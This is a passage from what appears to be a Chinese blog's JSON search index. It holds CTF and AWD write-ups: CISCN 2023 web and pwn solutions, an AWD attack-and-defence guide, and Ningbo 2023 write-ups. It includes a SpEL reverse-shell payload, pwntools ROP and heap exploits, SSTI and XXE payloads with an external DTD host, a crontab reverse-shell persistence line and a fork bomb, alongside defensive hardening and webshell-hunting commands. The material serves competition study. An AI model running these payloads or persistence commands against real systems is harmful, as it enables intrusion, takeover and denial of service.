!isset($_GET['table_2_dump'])){\n    echo 'use ?db=&table_2_query= or ?db=&table_2_dump= to view the tables! etc:?db=ctf&table_2_query=flag1';\n    die();\n}\nif(isset($_GET['db'])){\n    $db=$_GET['db'];\n}\nelse{\n    die('no db!');\n}\nif(isset($_GET['table_2_query'])){\n    $t2q = $_GET['table_2_query'];\n    $sql = \"select * from $db.$t2q\";\n    if(!(is_valid($t2q))){\n        die('nop');\n    }\n    if(!(is_valid($db))){\n        die('nop');\n    }\n    echo $sql;\n    echo '</br>';\n    try{\n    \t$stm = $conn->query($sql);\n    \t$res = $stm->fetch();\n    \tvar_dump($res);\n    }\n    catch(PDOException $e){\n    \tdie('error');\n    }\n    die();\n}\nif(isset($_GET['table_2_dump'])){\n    $t2d=$_GET['table_2_dump'];\n    if(!(is_valid($t2d))){\n        die('nop');\n    }\n    if(!(is_valid($db))){\n        die('nop');\n    }\n\n    $randstr = md5(time());\n    $dump='mariadb-dump '.$db.' '.$t2d.' >./log/'.$randstr.'.log';\n    system($dump);\n    echo 'dump log here: <a href=\\''.'./log/'.$randstr.'.log'.'\\'>here</a>';\n\n}\n\n?>\n```\n\n## BackendService\n\nnacos服务，CVE-2021-29441添加任意用户进后台\n\n![](/img/wp/2023/2023ciscn-17.png)\n\n\n分析`backend-1.0-SNAPSHOT.jar`\n\n发现内部配置服务有个8888的gateway服务，id为backcfg\n\n```yml\nspring:\n  cloud:\n    nacos:\n      discovery:\n        server-addr: 127.0.0.1:8888\n      config:\n        name: backcfg\n        file-extension: json\n        group: DEFAULT_GROUP\n        server-addr: 127.0.0.1:8888\n```\n\n可以通过修改Gateway配置文件反代backendservice服务实现rce\n\n参考文章：https://xz.aliyun.com/t/11493#toc\n\n![](/img/wp/2023/2023ciscn-18.png)\n\n反弹shell\n\n```json\n{\n    \"spring\":{\n        \"cloud\":{\n            \"gateway\":{\n                \"routes\":[\n                    {\n                        \"id\":\"exam\",\n                        \"order\":0,\n                        \"uri\":\"lb://backendservice\",\n                        \"predicates:\":[\n                            \"Path=/evil/**\"\n                        ],\n                        \"filters\":[\n                            {\n                                \"name\":\"RewritePath\",\n                                \"args\":{\n                                    \"replacement\":\"#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{'bash','-c','bash -i >& /dev/tcp/xxxx/xxxx 0>&1'}).getInputStream())).replaceAll('\\n','').replaceAll('\\r','')}\"\n                                }\n                            }\n                        ]\n                    }\n                ]\n            }\n        }\n    }\n}\n```\n\n\n![](/img/wp/2023/2023ciscn-19.png)\n\n\n## go_session\n\n源码\n\n```go\npackage route\n\nimport (\n\t\"github.com/flosch/pongo2/v6\"\n\t\"github.com/gin-gonic/gin\"\n\t\"github.com/gorilla/sessions\"\n\t\"html\"\n\t\"io\"\n\t\"net/http\"\n\t\"os\"\n)\n\nvar store = sessions.NewCookieStore([]byte(os.Getenv(\"SESSION_KEY\")))\n\nfunc Index(c *gin.Context) {\n\tsession, err := store.Get(c.Request, \"session-name\")\n\tif err != nil {\n\t\thttp.Error(c.Writer, err.Error(), http.StatusInternalServerError)\n\t\treturn\n\t}\n\tif session.Values[\"name\"] == nil {\n\t\tsession.Values[\"name\"] = \"guest\"\n\t\terr = session.Save(c.Request, c.Writer)\n\t\tif err != nil {\n\t\t\thttp.Error(c.Writer, err.Error(), http.StatusInternalServerError)\n\t\t\treturn\n\t\t}\n\t}\n\n\tc.String(200, \"Hello, guest\")\n}\n\nfunc Admin(c *gin.Context) {\n\tsession, err := store.Get(c.Request, \"session-name\")\n\tif err != nil {\n\t\thttp.Error(c.Writer, err.Error(), http.StatusInternalServerError)\n\t\treturn\n\t}\n\tif session.Values[\"name\"] != \"admin\" {\n\t\thttp.Error(c.Writer, \"N0\", http.StatusInternalServerError)\n\t\treturn\n\t}\n\tname := c.DefaultQuery(\"name\", \"ssti\")\n\txssWaf := html.EscapeString(name)\n\ttpl, err := pongo2.FromString(\"Hello \" + xssWaf + \"!\")\n\tif err != nil {\n\t\tpanic(err)\n\t}\n\tout, err := tpl.Execute(pongo2.Context{\"c\": c})\n\tif err != nil {\n\t\thttp.Error(c.Writer, err.Error(), http.StatusInternalServerError)\n\t\treturn\n\t}\n\tc.String(200, out)\n}\n\nfunc Flask(c *gin.Context) {\n\tsession, err := store.Get(c.Request, \"session-name\")\n\tif err != nil {\n\t\thttp.Error(c.Writer, err.Error(), http.StatusInternalServerError)\n\t\treturn\n\t}\n\tif session.Values[\"name\"] == nil {\n\t\tif err != nil {\n\t\t\thttp.Error(c.Writer, \"N0\", http.StatusInternalServerError)\n\t\t\treturn\n\t\t}\n\t}\n\tresp, err := http.Get(\"http://127.0.0.1:5000/\" + c.DefaultQuery(\"name\", \"guest\"))\n\tif err != nil {\n\t\treturn\n\t}\n\tdefer resp.Body.Close()\n\tbody, _ := io.ReadAll(resp.Body)\n\n\tc.String(200, string(body))\n}\n```\n\n有三个路由\n```go\n\tr.GET(\"/\", route.Index)\n\tr.GET(\"/admin\", route.Admin)\n\tr.GET(\"/flask\", route.Flask)\n```\n\n`Index`路由提供了一个默认的session，name赋值为guest\n`Admin`路由判断session，需要name值为admin，并使用EscapeString转义name，而且还使用了pongo2渲染，存在ssti漏洞\n`Flask`路由访问内部5000端口的flask服务并回显页面\n\n\n\n因为`SESSION_KEY`是从环境变量获取的，猜测为空，进行`session`伪造\n本地修改`session.Values[\"name\"] = \"admin\"`，运行拿到伪造的`session`\n\n![](/img/wp/2023/2023ciscn-20.png)\n\n\n访问`/flask?name=/`通过报错拿到`flask`源码\n\n![](/img/wp/2023/2023ciscn-21.png)\n\n```python\nfrom flask import Flask,request\napp = Flask(__name__)\n\n\n@app.route('/')\ndef index():\n    name = request.args['name']\n    return name + 'no ssti'\n\n\nif __name__== \"__main__\":\n    app.run(host=\"127.0.0.1\",port=5000,debug=True)\n```\n\n\n可以看到`flask`开启了`debug`模式，`debug`攻击点一般在`算pin`或`debug热加载`\n但是访问`/console`实现rce需要携带cookie验证，因为我们无法传递cookie，所以利用ssti读文件算pin后rce这条路走不通\n\n如图，当flask文件的内容被更改后，flask会自动更新，也就是热加载\n\n![](/img/wp/2023/2023ciscn-22.png)\n\n所以我们可以利用ssti实现任意文件读写，然后覆盖server.py，实现自己的恶意内容\n\n\n查阅[官方手册](https://pkg.go.dev/github.com/flosch/pongo2#section-readme)可知pongo2与Django 1.7有兼容的语法和功能集\n\nDjango中的include语法在pongo2中也能使用，所以可以用include实现任意文件读取\n![](/img/wp/2023/2023ciscn-23.png)\n\n写文件可以⽤Gin Context里的FormFile来读取表单⽂件，用SaveUploadFile上传，注意需要用GET传参\n\n![](/img/wp/2023/2023ciscn-24.png)\n\n![](/img/wp/2023/2023ciscn-25.png)\n\n```golang\n//读文件\n{%include c.Request.Referer()%}\n{%include c.Request.Host()%}\n\n//写文件\n//这三个payload其实大同小异，只是后两个使用了过滤器（c.HandlerName的值为 main/route.Admin ）\n{{c.SaveUploadedFile(c.FormFile(c.Request.Host),c.Request.Referer())}}\n{%set form=c.Query(c.HandlerName|first)%}{{c.SaveUploadedFile(c.FormFile(form),c.Request.Referer())}}&m=file\n{%set form=c.Query(c.HandlerName|first)%}{%set path=c.Query(c.HandlerName|last)%}{%set file=c.FormFile(form)%}{{c.SaveUploadedFile(file,path)}}&m=file&n=/app/server.py\n```\n\n\n![](/img/wp/2023/2023ciscn-26.png)\n\n覆盖后就可以执行我们自定义的内容了\n\n![](/img/wp/2023/2023ciscn-27.png)\n\n\n\n\n# pwn\n\n## 烧烤摊儿\n\n修改名称存在栈溢出，程序不存在`system`函数，使用`orw`获取`flag`\n\n```python\nfrom pwn import *\n#p=process('./shaokao')\np=remote(\"123.56.251.120\",\"12585\")\ne=ELF(\"./shaokao\")\n\nfopen=e.sym['open64']\nread=e.sym['read']\nwrite=e.sym['write']\n#gdb.attach(p,'bp 0x401fae')\nrdi=0x000000000040264f #rdi\nrsi=0x000000000040a67e #rsi\nrdx=0x00000000004a404b #rdx rbx\np.sendlineafter('> ','1')\np.sendline(\"3\")\np.sendline('-100000')\np.sendlineafter('> ','4')\np.sendlineafter('> ','5')\npayload=b'flag'.ljust(0x28,b'\\x00')\npayload+=p64(rdi)+p64(0x4e60f0)+p64(rsi)+p64(0)+p64(fopen)\npayload+=p64(rdi)+p64(3)+p64(rsi)+p64(0x4e60f0)+p64(rdx)+p64(0x40)+b'a'*8+p64(read)\npayload+=p64(rdi)+p64(1)+p64(write)\np.sendline(payload)\n```\n\n## StrangeTalkBot\n\n程序使用了`protobuf`协议解析输入数据，构造`protobuf`数据，传入即可\n程序中存在`uaf`漏洞与数组越界漏洞，利用`gadget`构造栈迁移，实现`orw`\n\n```python\nfrom pwn import *\nimport varint\nimport sys\n\ndef Mode(m):\n    return b'\\x08'+varint.encode(m<<1)\n\ndef Ind(i):\n    return b'\\x10'+varint.encode(i<<1)\n\ndef Size(s):\n    return b'\\x18'+varint.encode(s<<1)\n\ndef Data(d):\n    return b'\\x22'+varint.encode(len(d))+d\n\n\ndef add(ind,size,data=b' '):\n    payload=Mode(1)+Ind(ind)+Size(size)+Data(data)\n    p.sendafter(\"now: \\n\",payload)\n\ndef edit(ind,data):\n    payload=Mode(2)+Ind(ind)+Size(0)+Data(data)\n    p.sendafter(\"now: \\n\",payload)\n\ndef show(ind):\n    payload=Mode(3)+Ind(ind)+Size(0)+Data(b'')\n    p.sendafter(\"now: \\n\",payload)\n\ndef free(ind):\n    payload=Mode(4)+Ind(ind)+Size(0)+Data(b'')\n    p.sendafter(\"now: \\n\",payload)\n\ne=ELF(\"./pwn\")\ncontext.binary=e\nlibc=ELF(\"./libc-2.31.so\")\nif len(sys.argv)==1:\n    p=process(\"./pwn\")\n    gdb.attach(p)\nelse:\n    p=remote(\"123.56.244.196\",\"35492\")\n\nfor i in range(10):\n    add(i,0xe8)\n\nfor i in range(7):\n    free(i)\n\nshow(1)\nheap=u64(p.read(8))\nprint(hex(heap))\n\nshow(2)\nheap1=u64(p.read(8))\nprint(hex(heap1))\n\nfree(7)\nfree(8)\n\nshow(8)\nd=u64(p.read(8))\nprint(hex(d))\n\nlibc.address=d-0x1eccc0\nfree_hook=libc.sym['__free_hook']\ngadget=libc.address+0x154dea\nmprotect=libc.sym['mprotect']\nrdi=0x0000000000023b6a+libc.address\nrsi=0x000000000002601f+libc.address\nrdx=0x0000000000142c92+libc.address\nleave=libc.address+0x00000000000578c8\nedit(6,p64(free_hook))\n\nadd(0x20,0xe8)\n\npayload=b'a'\n\nedit(0,flat([heap+0x48,leave,\n    heap1&0xfffffffffffff000,\n    heap,0,\n    leave,0,0,0,\n    heap,\n    rdi,heap1&0xfffffffffffff000,\n    rsi,0x1000,\n    rdx,7,\n    mprotect,\n    heap1]))\n\nshellcode=shellcraft.open('flag')+shellcraft.read(3,heap-0x50,0x50)+shellcraft.write(1,heap-0x50,0x50)\nedit(1,asm(shellcode))\n\nadd(0x11,0xe8)\nadd(0x12,0xe8,p64(gadget))\n\nprint(hex(free_hook))\nprint(hex(gadget))\n\nfree(0)\np.interactive()\n```\n\n\n## funcanary\n\n程序使用了`fork`，所以在子进程中报错，不会使程序中断，所以爆破`canary`，然后跳转到后门位置就可以了\n\n```python\nfrom pwn import *\nbackdoor=0x1229\n\n#p=process(\"./funcanary\")\np=remote(\"123.56.135.185\",\"32640\")\n\ncanary=b'\\x00'\nfor i in range(7):\n    for j in range(0x100):\n        p.sendafter(b'welcome\\n',b'a'*0x68+canary+p8(j))\n        data=p.readline()\n        if b'stack' not in data:\n            print(j)\n            canary+=p8(j)\n            break\ni=0\ncontext.log_level='debug'\nf=open('data','wb')\nwhile i<0x10:\n    for j in range(0x30):\n        data=p.readuntil('welcome\\n')\n        f.write(data)\n        p.send(b'a'*0x68+canary+b'b'*8+p16(0xffff&(0x1200+j+i*0x1000)))\n        pause()\n    i+=1\n\n\np.interactive()\n```\n\n\n## Shell We Go\n\n当认证结束之后，执行`echo`指令，存在栈溢出，使用`+`可以跳过栈空间，直接覆盖返回值\n构造`rop`，执行`orw`\n\n```python\nfrom pwn import *\np=remote(\"47.93.187.243\",\"38686\")\np.sendline(b\"cert nAcDsMicN  S33UAga1n@#!\")\ncontext.log_level='debug'\ncmd=\"\"\"\nbp 0x4c181a\nbp 0x4c18a0\n\"\"\"\ndef makepayload(data):\n    e=b''\n    i=0\n    step=0x20\n    while i<len(data):\n        e+=data[i:i+step]+b' '\n        i+=step\n    pass\n    return b'echo '+e\n\nrdi=0x0000000000444fec\nsystem=0x43e7e6\nrsi=0x000000000041e818\nrdx=0x000000000049e11d\nsh=0x4c38e7\nrax=0x000000000040d9e6\nflag=0x4c34c8\nsyscall=0x000000000040328c\ne=ELF(\"./pwn\")\nbss=e.bss()\n\npayload=b'+'*(0x298-0x78)+b'\\x00'*3+p64(rdi)+p64(flag)+p64(rsi)+p64(0)+p64(rdx)+p64(0)+p64(rax)+p64(2)+p64(syscall)\npayload+=p64(rdi)+p64(3)+p64(rsi)+p64(bss+0x200)+p64(rdx)+p64(0x40)+p64(rax)+p64(0)+p64(syscall)\npayload+=p64(rdi)+p64(1)+p64(rsi)+p64(bss+0x200)+p64(rdx)+p64(0x40)+p64(rax)+p64(1)+p64(syscall)\n\np.sendline(makepayload(payload))\np.interactive()\n```\n\n\n\n# reverse\n\n## babyRE\n\nhttps://snap.berkeley.edu/ 导入xml\n\n导出密文后异或得到flag\n\n![](/img/wp/2023/2023ciscn-28.png)\n\n```python\na=[102,10,13,6,28,74,3,1,3,7,85,0,4,75,20,92,92,8,28,25,81,83,7,28,76,88,9,0,29,73,0,86,4,87,87,82,84,85,4,85,87,30]\n\nfor i in range(1,len(a)):\n    a[i]=a[i]^a[i-1]\n\nprint(bytes(a))\n```","tags":["wp","2023竞赛","ciscn"],"categories":["wp"]},{"title":"AWD攻击与防御","url":"/posts/6118732e/","content":"\n\n# 攻击\n\n## 主机发现\n\n如果官方没公开靶机地址（通常不会给），则攻击手首先要做的事就是先找到每个主机地址和端口\n\n用工具或者自己的脚本都行，不过建议提前准备好脚本，现场写会慢一点可能还会出问题\n\n\n\n## 弱口令\n\n**ssh弱口令**\n可能会有些队伍没有改\n\n**web弱口令**\n一般在后台登录处，或者phpmyadmin之类的服务\n\n\n\n## 代码审计\n\n代码审计是攻防一体的工作，当发现漏洞时，进攻的同时跟防守的队友商讨如何修复\n\n**预留后门**\n某些地市级awd比赛为了降低难度一般会设置一句话木马，注意第一时间删除然后用脚本去批量打其他主机\n\n\n**其他漏洞**\n\n将源码下载到本地，先用D盾或者河马等扫描工具大概扫描下，在深入挖掘漏洞\n\n\n\n\n## 权限维持\n\n\n**不死马**\n\n参考文章：[AWD不死马与克制方法](https://www.dr0n.top/posts/46ef80a/)\n\n**内核漏洞提权**\n\n```text\nhttps://github.com/The-Z-Labs/linux-exploit-suggester\n```\n\n**crontab写定时任务**\n\n```bash\n//每分钟反弹shell到 127.0.0.1的5353端口\n(crontab -l;printf \"* * * * * /bin/bash -c 'bash -i >& /dev/tcp/127.0.0.1/5353 0>&1'\\n\")|crontab -\n```\n\n\n\n## 搅屎\n\n1：到最后一轮时，该拿完的flag拿到时可以进行删站，无限复制等操作\n\n\n2：fork炸弹\n```bash\n##!/bin/sh\n/bin/echo '.() { .|.& } && .' > /tmp/aaa;/bin/bash /tmp/aaa;\n```\n\n# 防御\n\n## web防御\n\n#### ssh登录\n\nssh命令登录或者使用图形化工具连接\n\n```bash\n//ssh连接\nssh -p 2222 ctf@xx.xx.xx.xx\n\n//免密登录\nssh-copy-id -i ~/.ssh/id_rsa.pub ctf@xx.xx.xx.xx\n```\n\n\n#### 备份源码\n\n比赛一开始就需要有一个队友对网站源码和数据库数据进行备份，如果后续被删站了可以及时恢复\n\n```bash\n##网址备份\ntar -zcvf web.tar.gz /var/www/html\n\n##数据库备份-全部数据\nmysqldump -uroot -proot --all-databases --skip-lock-tables > /tmp/db.sql\n##数据库备份-指定数据库和表\nmysqldump -uroot -proot --databases DB1 DB2 > /tmp/db.sql\n##数据库恢复（mysql终端下执行）\nsource /tmp/db.sql\n```\n\n\n\n#### 改密码\n\n**ssh密码**\n如果发现拿到的ssh密码不是类似于`SDs2dKJaH5hs`的随机强口令，而是类似于`ctf/123456`，则需要更改ssh密码\n\n```bash\npasswd\n```\n\n**web后台密码**\n一般题目大概率是一个cms或者自己写的网站，那么后台就有可能存在弱口令，需要修改\n\n\n**mysql密码**\nmysql密码是很多队伍会忽略的地方，当然也同样重要。改完要注意cms中的配置文件，不然可能会导致cms连不上数据库而崩溃\n\n```bash\n##方法一（mysql终端下执行）\nshow databases;\nuse mysql\nset password for root@localhost = password('123');\n\n##方法二（mysql终端下执行）\nupdate user set password = PASSWORD('需要更换的密码') where user='root';\nflush privileges;\nshow tables;\n\n##方法三\nmysqladmin -u用户名 -p旧密码 password 新密码\n```\n\n\n\n#### 代码审计\n\n一般先用D盾，河马等工具扫一遍，发现一句话木马等较明显的漏洞，再用seay等或手动分析，或者可以找找历史漏洞cve等\n\n找到漏洞后根据漏洞的种类进行修复\n\n1：删站\n不建议。如果参赛手册中没有明确禁止，这是最简单粗暴的姿势\n\n\n2：删页面\n只要删掉有漏洞的页面就行了，比如删后台登录页面、注册页面、上传页面等等\n\n\n3：破坏正常功能\n如果手册中规定了不能删除任何页面，则可以让这些漏洞点的功能函数失效\n\n\n4：正常修补手段\n如加白名单，字符过滤转义，设置open_basedir等，有权限还可以修改php.ini，改完记得重启\n\n\n```php\n;禁用危险函数\ndisable_functions = exec,system,shell_exec,popen,passthru,pcntl_exec,phpinfo\n\n;预防sql注入\nmagic_quotes_gpc = on\n\n;远程文件包含\nallow_url_fopen = off\nallow_url_include = off\n\n;重启php服务\nservice php-fpm restart\n```\n\n\n\n#### 上waf\n\nwaf也是比较重要的一点。一般可以分为两个类型，一种是只有监控的功能，可以监控流量方便分析其他队的payload，一般比赛的检查都能通过。另一种就是带拦截的防御waf，也称通防，一般比赛不允许使用\n\n\n几个waf项目\n\n1：AoiAWD\n安恒维护的开源项目，需要提前在本机编译，支持web，pwn流量捕获，系统进程监控等\n地址：https://github.com/DasSecurity-HatLab/AoiAWD\n\n\n2：watchbird\n通防waf，支持流量转发和替换flag，防御注入，反序列化，rce等漏洞\n地址：https://github.com/leohearts/awd-watchbird\n\n\n\n\n#### shell查杀\n\n对于不死马可以参考我以前写的一篇文章：[AWD不死马与克制方法](https://www.dr0n.top/posts/46ef80a/)\n\n一些find命令\n\n```bash\n##寻找最近20分钟修改过的文件\nfind /var/www/html -name *.php -mmin -20\n\n##寻找行数最短的文件\nfind ./ -name '*.php' | xargs wc -l | sort -rg\n\n##关键字查杀\nfind . -name '*.php' | xargs grep -n 'eval('\n```\n\n\n查看进程\n\n```bash\nnetstat -nlpt\nps -df\ntop\n```\n\n杀死进程\n\n```bash\nkill -9 PID\nkillall 名称\n```\n\n\n#### 别名\n\n经过实践，发现别名似乎在网站上rce执行命令时并不会生效\n\n```bash\n##修改cat的别名\nalias cat=\"echo `date`|md5sum|cut -d ' ' -f1||\"\nalias cat=\"printf 'flag{%s}' $(date | md5sum | cut -d ' ' -f1)\"\n\n\n##去除别名\nunalias -a\n```\n\n\n\n\n## pwn防御\n\n#### 打patch\n\n参考：https://q1iq.top/IDA-patch\n\n#### 上通防\n\n现在大部分比赛不允许上通防，因为通防基本可以实现完美防御\n\n通防是通用防御的简称。因为awd里pwn题的形式基本都是运行一个二进制，然后把二进制的流量转发到某个端口，所以如果给这个pwn题加个壳子过滤一下流量，所有带flag的字符串都不允许输出，所有带flag的文件都不允许打开，基本上就没办法攻击了。\n\n以下是几个通防项目\n\n[PwnSandboxForCTF](https://github.com/rip1s/PwnSandboxForCTF)：Ptrace，劫持敏感syscall，检查参数过滤敏感字符串\n\n[evilPatcher](https://github.com/TTY-flag/evilPatcher)：Seccomp沙盒，劫持syscall，无法过滤指针类参数\n\n[pwn_waf](https://github.com/I0gan/pwn_waf)：抓取流量、通防、转发、多人转发模式，\n\n[LIEF](https://lief-project.github.io/download/)：劫持敏感函数调用，过滤敏感字符串等。对原文件改动较小\n\n\n\n\n","tags":["总结","awd"],"categories":["awd"]},{"title":"2023宁波市赛wp","url":"/posts/2d3983d/","content":"\n# web\n\n## Query\n\nsqlmap一把梭\n\n![](/img/wp/2023/2023ningbo-1.png)\n\n\n\n## Deserialization\n\n源码\n\n```php\n//The location of the flag is at route.php\n$read = $_POST[\"read\"];\n$input = $_POST[\"input\"];\nif(!isset($read) or !isset($input))\n{\n    die(\"NONONO!\");\n}\nif(strpos($read, \"f14g\")===FALSE)\n{\n    include($read);\n    $input = unserialize($input);\n    $input2 = clone $input;\n    $input2->position = \"route.php\";\n}\nelse{\n    die(\"NONONO!\");\n}\n```\n\n`php://filter`读`route.php`\n\n得到\n\n```php\n<h1>Here can you find the position of the flag!</h1>\n<?php\n$position = \"f14g.php\";\n$gadget = \"h1nt.php\";\n?>\n```\n\n再读`h1nt.php`\n\n```php\n<?php\nclass test\n{\n    public $position;\n    public function __clone(){\n        echo file_get_contents($this->position);\n        return $this->position;\n    }\n}\n?>\n```\n\n反序列化，调用`__clone`方法时读`f14g.php`\npayload\n\n```php\n<?php\nclass test\n{\n    public $position='f14g.php';\n}\n\n$a = new test();\necho serialize($a);\n//read=h1nt.php&input=O:4:\"test\":1:{s:8:\"position\";s:8:\"f14g.php\";}\n```\n\n\n## CodeCheck\n\n```php\n$flag = \"***********\";\nif(!isset($_GET['a']) or !isset($_GET['b']))\n{\n    die(\"NONONO\");\n}\nif(file_get_contents($_GET['a'])!== \"flag\")\n{\n    die(\"NONONO\");\n}\nif(file_get_contents($_GET['b'])!==$_GET['c'])\n{\n    die(\"NONONO\");\n}\nif(isset($_GET['d']))\n{\n    include($_GET['d']);\n}\n```\n\n使用`php://input`使得a的值为`flag`，b同理，d使用`php://filter`读文件\n\n![](/img/wp/2023/2023ningbo-2.png)\n\n\n\n## easy_java\n\n访问靶机自动跳转到`/parser?body=%7B\"1\"%3A\"2\"%7D`，并返回`json`\n访问`/parser?body=1`，返回`plain`\n\n猜测这是一个类型解析器，可以解析输入的数据类型并返回\n\nfuzz后发现支持xml格式，尝试利用xxe漏洞。因为是java环境，尝试使用`jar协议`，[原理参考](https://www.lewiserii.top/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/xxe%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93.html#jar-x2F-x2F-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)\n\n\n![](/img/wp/2023/2023ningbo-3.png)\n\n\nvps上用flask构建一个恶意dtd\n\n```python\n<!ENTITY % c SYSTEM \"file:///flag\">\n<!ENTITY % a \"<!ENTITY remote SYSTEM 'jar:http://20.2.129.79/1.zip!/%c;'>\">\n```\n\n在apache上放一个1.zip，内容随意\n\n当`jar协议`在`1.zip`中找不到`file://`中指定的文件时就会报错，通过报错回显文件内容\n\n\n且过滤了`\"http`，可以使用`\"url:http`来绕过\n\n最终payload\n\n```xml\n<!DOCTYPE convert [\n    <!ENTITY % b SYSTEM \"url:http://20.2.129.79:7777/evil.dtd\">\n    %b;\n    %a;\n]>\n<convert>&remote;</convert>\n```\n\n![](/img/wp/2023/2023ningbo-4.png)\n\n\n\n\n## easy_upload\n\n打开靶机后有一个文件上传功能\n\n但是对路径，后缀，文件内容进行了检测\n\n路径中过滤了`..`，不能进行目录穿越，只能存放在`/tmp/`下，·且后缀检查的黑名单较严格\n\n```php\n<?php\n\nfunction check_path($path){\n    $black_list = [\"php\",'\\.\\.',\"htaccess\",\"ini\",\"html\"];\n    if (preg_match('/(' . implode('|', $black_list) . ')/i', strtolower($path))) {\n        return false;\n    }\n    return true;\n}\n\nfunction check_extension($extension){\n    $black_list = array('php', 'php3', 'php4', 'php5', 'phtml', 'py', 'pl','pyc','php7','html','ini','htaccess');\n    if (in_array(strtolower($extension),$black_list)){\n        return false;\n    }\n    return true;\n}\n\nfunction up_base64($file_path, $base64)\n{\n\n    if (preg_match('/^(data:\\s*image\\/(\\w*);base64,)/', $base64, $result)) {\n\n        $type = $result[2];\n        if (!check_extension($type)){\n            return false;\n        }\n        $res = '/tmp/' . time() . \"/\";\n        if (!is_dir($res)) {\n            mkdir($res, 0777);\n        }\n        $newFile = $res . $file_path . \".{$type}\";    //图片名以时间命名\n        //保存为文件\n        if (file_put_contents($newFile, base64_decode(str_replace($result[1], '', $base64)))) {\n            //返回这个图片的路径\n            return $newFile;\n        } else {\n            return false;\n        }\n    } else {\n        return false;\n    }\n}\n\nif (isset($_GET[\"action\"]) and $_GET['action'] == 'base64') {\n    if (check_path($_GET[\"path\"])) {\n        $res = up_base64($_GET[\"path\"], file_get_contents(\"php://input\"));\n        if (!$res){\n            echo \"<h1>upload success</h1>\";\n        }else{\n            echo \"<h1>Hacker!</h1>\";\n        }\n    }\n} else {\n    highlight_file(__FILE__);\n}\n```\n\n同时扫描网址发现存在`/app`路由\n\n![](/img/wp/2023/2023ningbo-5.png)\n\n```python\nimport sys\nfrom flask import Flask, request\nfrom challenge import challenge\nimport re\n\napp = Flask(__name__)\n\n\ndef check(value: str):\n    black_list = [\"app\", \"_static_folder\", \"pardir\", \"os\",\n                  \"env\", \"jinja\", \"modules\", \"exported\",\"loader\",\"__spec__\"]\n    if re.findall(\"r'[^\\w\\.\\[\\]]'\", value):\n        return False\n    else:\n        for i in black_list:\n            if i in value:\n                return False\n\n    return True\n\n\n@app.route(\"/app/set\", methods=[\"POST\"])\ndef set():\n    key, value = request.json.get('key'), request.json.get('value')\n\n    if not key or type(key) != str:\n        return {\"message\": \"Not key or key must be str\"}, 400\n    if len(key) > 100:\n        return {\"message\": \"Key may be too long!\"}, 400\n    if value and len(value) > 20:\n        return {\"message\": \"Value may  be too long!\"}, 400\n    if not value:\n        game.complete(value)\n        return {\"message\": \"Key set success !\"}, 200\n    if type(value) != str:\n        return {\"message\": \"Value must be a string!\"}, 400\n\n    if not check(key):\n        print(key)\n        return {\"message\": \"Hacker!\"}, 400\n\n    # pydash?\n    if game.set(key, value):\n        return {\"message\": \"Task updated!\"}, 200\n    return {\"message\": \"Invalid task name!\"}, 400\n\n\n@app.route(\"/app/\", methods=[\"GET\"])\ndef get_source():\n    fp = open(__file__)\n    res = fp.read()\n    fp.close\n    return res.replace(\" \", \" \").replace(\"\\n\", \"\n\")\n\n\n@app.route(\"/app/get\", methods=[\"GET\"])\ndef get_date():\n    import backdoor\n    flag = backdoor.backdoor()\n    sys.modules.pop(\"backdoor\")\n    return flag\n\n\ngame = challenge()\napp.run('0.0.0.0', 3000)\n```\n\n其中有三个路由\n\n`/app`显示当前代码\n`/app/get`存在后门，有导入包的操作\n`/app/set`用于设置键值对\n\n\n其中存在提示`# pydash?`，表示通过`pydash`设置属性，而`pydash`低版本存在类污染，可以利用`pydash.set`来设置或覆盖属性值，也可以设置路径\n\n在`/app/get`路由中存在一个`import`的操作，当`Python`解释器遇到`import`语句时，它会在`sys.path`变量中指定的路径中搜索模块，其中`sys.path[0]`则表示最初调用`Python`解释器的脚本所在的绝对路径\n\n所以我们可以上传一个名称为`backdoor`的py文件，再利用`pydash.set`覆盖`sys.path[0]`的值，使其寻找包时找到我们的恶意包\n\n\n同时题目中还存在一个waf\n\n```python\nblack_list = [\"app\", \"_static_folder\", \"pardir\", \"os\",\n                  \"env\", \"jinja\", \"modules\", \"exported\",\"loader\",\"__spec__\"]\n```\n\n可以利用`pydash.helpers`导入`inspect`来绕过\n\n![](/img/wp/2023/2023ningbo-6.png)\n\n\n还有一点要注意，上传时对`$type`进行了检查，不允许上传`py`类型的文件，但是`$type`的值是可控的，我们可以将其置空\n\n```php\n//line 32\n$newFile = $res . $file_path . \".{$type}\";\n```\n\n如果`$type`为空，就会在文件尾加一个点，例如`backdoor.py.`\n\n这里可以用`file_put_contents`的一个`trick`绕过，如图\n\n![](/img/wp/2023/2023ningbo-7.png)\n\n例如`backdoor.py/.`，`file_put_contents`会自已给标准化成绝对路径\n\n\n\nexp\n\n```python\nimport time\nimport requests\nimport base64\n\nurl = \"x.x.x.x\"\nshell = '''import os\ndef backdoor():\n    return os.popen(\"cat /flag\").read()\n'''\n\ndef exploit():\n    data = \"data:image/;base64,\" + base64.b64encode(shell.encode()).decode()\n    start = int(time.time())\n    res = requests.post(\n        url=url+\"index.php?action=base64&path=backdoor.py/\", data=data)\n    end = int(time.time())\n    for i in range(start, end+2):\n        print(i)\n        data = {\n            \"key\": \"__init__.__globals__.pydash.helpers.inspect.sys.path[0]\",\n            \"value\": \"/tmp/%s/\" % (i)\n        }\n        print(data)\n        requests.post(url=url+\"app/set\",json=data)\n        res = requests.get(url=url+\"app/get\")\n        if \"flag??\" not in res.text and res.status_code != 500:\n            print(res.text)\n            break\n        else:\n            print(res.text)\n\nif __name__ == \"__main__\":\n    exploit()\n```\n\n\n\n\n\n# misc\n\n\n## zip\n\nzip注释：`The art of 0 and 1, and it will remain shorter than 9.`\n\n\n生成字典\n```python\nmy_dict = {}\nfor i in range(1, 10):\n    bin_strings = [bin(j)[2:].zfill(i) for j in range(2**i)]\n    my_dict[i] = bin_strings\nfor key,value in my_dict.items():\n    with open('dic.txt','a+')as f:\n        for i in value:\n            f.write(i+'\\n')\n\n```\n\n爆破得到密码`01001101`\n\n解压得到flag\n\n\n## SimpleDocument\n\n图片分离出一个pdf，用pdf编辑器全选，发现有一个隐藏的文本\n\n![](/img/wp/2023/2023ningbo-8.png)\n\n\n## BeautifulImage\n\nstegsolve分析，0通道藏有base加密字符串\n\n![](/img/wp/2023/2023ningbo-9.png)\n\n\n## tree\n\n下载附件得到一个`tree.py`，约有60w行代码\n\n部分代码如下\n\n```python\nimport 